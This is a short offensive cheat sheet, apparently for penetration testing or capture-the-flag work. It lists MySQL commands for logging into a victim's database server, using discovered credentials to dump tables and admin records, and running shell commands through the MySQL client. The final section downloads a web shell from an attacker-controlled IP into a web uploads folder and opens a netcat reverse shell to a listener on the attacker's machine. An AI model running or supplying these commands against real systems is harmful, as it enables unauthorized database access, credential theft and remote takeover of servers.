Connect to and query MySQL database 
------------------------------------
```
mysql -u root -p -h <victims-ip>
<password>
show databases;
use <databasename>;
show tables;
SELECT * FROM <tablename>;
```
MySQL example (use when creds are discovered)
--------------------------
```
mysql -u <db-username> --password=<password> -e "SHOW DATABASES;"
returned results <db1 db2 db3>

mysql -u <db-username> --password=<password> -D db1 -e "SHOW TABLES;"
returned results <table1 table2 table3 table4>

mysql -u <db-username> --password=<password> -D db1 -e "SELECT * FROM table1;"
returned results <blah blah blah>

mysql -u <db-username> --password=<password> -D db1 -e "select * from table1 WHERE username like 'admin%';"
```

MySQL execute shell commands
-----------------------------
```
mysql -u <username> --password=<password> -e "\! ls -l"
mysql -u <username> --password=<password> -e "\! whoami"
mysql -u <username> --password=<password> -e "\! wget -O /var/www/uploads/shell.??? http://xxx.xxx.xxx.xxx/shell.???"

# On attacker
# nc -lvvnp 1337
mysql -u <username> --password=<password> -e "\! nc xxx.xxx.xxx.xxx 1337 -e /bin/bash"
```

